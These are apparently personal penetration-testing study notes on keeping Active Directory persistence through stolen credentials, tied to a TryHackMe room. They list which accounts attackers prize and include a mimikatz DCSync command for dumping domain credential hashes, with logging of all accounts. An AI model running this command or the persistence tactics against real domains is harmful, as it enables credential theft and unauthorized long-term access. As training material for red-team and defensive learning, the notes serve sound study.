# AD Persistence With Credentials

This technique is the least reliable. Credential are:
- Domain restricted, but
	- Unless Account has `domain replication permissions`, which is required for [[AD-DC-Sync-Attack]]s
- Credential are rotated(changed) and can be by Blue Team, but
	- Near-privileged credentials for persistence is tactic of just enough to re-takeover, we need:
		- Credentials with Local Administrator Rights on as many machines as possible
		- Service Accounts that have delegation permissions for [[AD-Kerberos-Delegation-Exploitation]]
		- Accounts used for privileged AD services: WSUS, SCCM, etc   

## DCSync All

[[Mimikatz-Cheatsheet]]
```powershell
# mimikatz
lsadump::dcsync /domain:$domain /user:$user
# If want to dcsync every account mimikatz has builtin logging 
log dcdump.txt
```

Each domain controller runs a process called the Knowledge Consistency Checker (KCC). The KCC generates a replication topology for the AD forest and automatically connects to other domain controllers through Remote Procedure Calls (RPC) to synchronise information.

## References

[THM AD Persistence Room](https://tryhackme.com/room/persistingad)